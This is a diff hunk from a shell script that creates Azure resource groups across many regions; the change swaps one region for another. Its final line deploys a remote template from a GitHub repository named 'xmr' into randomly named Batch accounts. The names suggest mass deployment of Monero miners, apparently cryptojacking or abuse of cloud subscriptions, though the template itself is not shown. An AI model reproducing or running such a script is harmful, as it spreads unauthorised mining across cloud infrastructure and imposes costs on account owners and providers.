@@ -29,7 +29,7 @@ az group create --name westindia --location westindia
 az group create --name ukwest --location ukwest
 az group create --name canadaeast --location canadaeast
 az group create --name southindia --location southindia
-az group create --name koreasouth --location koreasouth
+az group create --name jioindiawest --location jioindiawest
 az group create --name australiacentral --location australiacentral
 az group create --name australiasoutheast --location australiasoutheast
 az deployment group create --parameters batchAccounts_abc0682d9_name='aaa9283'$RANDOM$RANDOM location='switzerlandnorth' --resource-group switzerlandnorth --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate.json
